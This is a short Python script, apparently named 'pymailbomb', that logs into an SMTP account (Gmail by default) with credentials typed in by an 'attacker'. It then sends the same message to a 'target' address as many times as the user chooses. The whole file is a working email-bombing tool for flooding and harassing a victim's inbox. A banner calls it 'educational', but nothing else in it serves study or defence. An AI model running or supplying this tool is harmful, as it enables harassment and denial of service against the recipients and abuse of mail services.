# encoding=utf8
#!/usr/bin/python3
import argparse
import os
import smtplib
import sys

from getpass import *
from typing import Type
from src.Colors import *
from time import *

def banner():
    banner = f'''
    {Color.ALERT}
    
______                          _  _  _                        _     
| ___ \  {Color.BLUE}@theycallmecharlie{Color.ALERT}    (_)| || |                      | |    
| |_/ /_   _  _ __ ___    __ _  _ | || |__    ___   _ __ ___  | |__  
|  __/| | | || '_ ` _ \  / _` || || || '_ \  / _ \ | '_ ` _ \ | '_ \ 
| |   | |_| || | | | | || (_| || || || |_) || (_) || | | | | || |_) |
\_|    \__, ||_| |_| |_| \__,_||_||_||_.__/  \___/ |_| |_| |_||_.__/ 
        __/ |                                                        
       |___/  {Color.DANGER} 4 EDUCATIONAL PURPOSE {Color.WHITE}                                                        
    {Color.WHITE}'''
    return banner


def main():
    parser = argparse.ArgumentParser(description="Pymail bombing")
    parser.add_argument('-n', '--name', help='A name to sent mail as', action='store_true')
    parser.add_argument('-m', '--mail', help='Attacker mail', action='store_true')
    parser.add_argument('-p', '--passw', help='Password app set', action='store_true')
    parser.add_argument('-t', '--target', help='Target mail', action='store_true')
    parser.add_argument('-q', '--quantity', help='Quantity of emails that\'ll be sent to the target', action='store_true')
    parser.add_argument('-body', '--body', help='Message', action='store_true')
    parser.add_argument('-smtp', '--smtpserver', action='store_true', default = 'smtp.gmail.com')
    parser.add_argument('-port', '--smtport', action='store_true', default = 587)
    args = parser.parse_args()
    menu()
def menu():
    try:
        name, mail, passw = input("Anon name: "), input("Attacker mail: "), input("Attacker passw: ")
        target, quantity, subject, body = input("Target mail: "), input("# sends"), input("Subject :"), input("Message: ")
        print(f'{Color.HEADER} Leave the info bellow in blank to use [smtp.gmail.com:587]{Color.WHITE}')
        smtpserver = input(f"[{Color.ALERT}Default{Color.WHITE}] smtp.gmail.com - SMTP SERVER: ")
        smtpport = input(f"[{Color.ALERT}Default{Color.WHITE}] 587 - SMTP PORT: ")
        if smtpserver == '': smtpserver = 'smtp.gmail.com'
        if smtpport == '': smtpport = '587'
        connection = smtplib.SMTP(smtpserver, smtpport)
        connection.ehlo(), connection.starttls(), connection.login(mail,passw)
        for i in range(1,int(quantity)+1):
            subject = subject
            connection.sendmail(mail, target, body)
            print(f'[{Color.GREEN}+{Color.WHITE}] {i} mail sent. ', end = '\r' )
            sleep(1), sys.stdout.flush()
        print('',end='\n'), connection.quit
        print(f'{Color.HEADER}Finished{Color.WHITE}')
        sys.exit(1)
    except smtplib.SMTPAuthenticationError:
        print(f'{Color.DANGER} Woops! Email or password entered is incorrect')
        sys.exit(1)
    except KeyboardInterrupt:
        print(f'{Color.HEADER} pymailbomb has been stopped')
        sys.exit(1)
    except Exception as error:
        print(f'{Color.DANGER} - {error} {Color.WHITE}')
        sys.exit(1)        
if __name__ == '__main__':
    print(banner())
    main()
